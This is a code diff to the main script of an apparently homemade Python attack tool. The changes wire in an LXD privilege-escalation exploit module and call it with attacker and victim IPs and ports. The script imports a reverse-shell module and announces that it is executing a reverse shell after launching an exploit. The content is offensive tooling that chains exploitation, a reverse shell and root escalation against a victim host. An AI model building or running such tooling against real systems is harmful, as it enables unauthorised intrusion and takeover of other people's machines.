@@ -5,6 +5,9 @@ import requests
 import errno
 import socket
 import my_reverse_shell
+
+from Privilege_Escalation_LXD import LXD_exploit
+
 from datetime import datetime
 from configparser import ConfigParser 	
 
@@ -42,9 +45,9 @@ def main():
 		if(ans == 'y' or ans == 'Y'):
 			flag = True
 	else:
-		create_conf.gen_config()
-	if flag:
-		create_conf.gen_config()
+		create_conf.gen_config(True)
+		
+	create_conf.gen_config(flag)
 		
 	while not os.path.exists('./config.ini'): # Wait while file is saved
 		pass
@@ -73,7 +76,8 @@ def main():
 	launch_exploit(attacker_info, victim_info)
 	user_dir = os.getcwd()
 	print('[*] Proceeding to execute the reverse shell')
-	os.system("python3 {dir}/Privilege_Escalation_LXD/main.py {ip} {port} {v_ip} {v_port}".format(dir = user_dir, ip = attacker_info["ip"], port = attacker_info["port"], v_ip = victim_info['ip'], v_port = victim_info['port']))
-
+	#os.system("python3 {dir}/Privilege_Escalation_LXD/main.py {ip} {port} {v_ip} {v_port}".format(dir = user_dir, ip = attacker_info["ip"], port = attacker_info["port"], v_ip = victim_info['ip'], v_port = victim_info['port']))
+	LXD_exploit.run(attacker_info["ip"], attacker_info["port"], victim_info['ip'], victim_info['port'])
+	
 if __name__ == '__main__':
 	main()
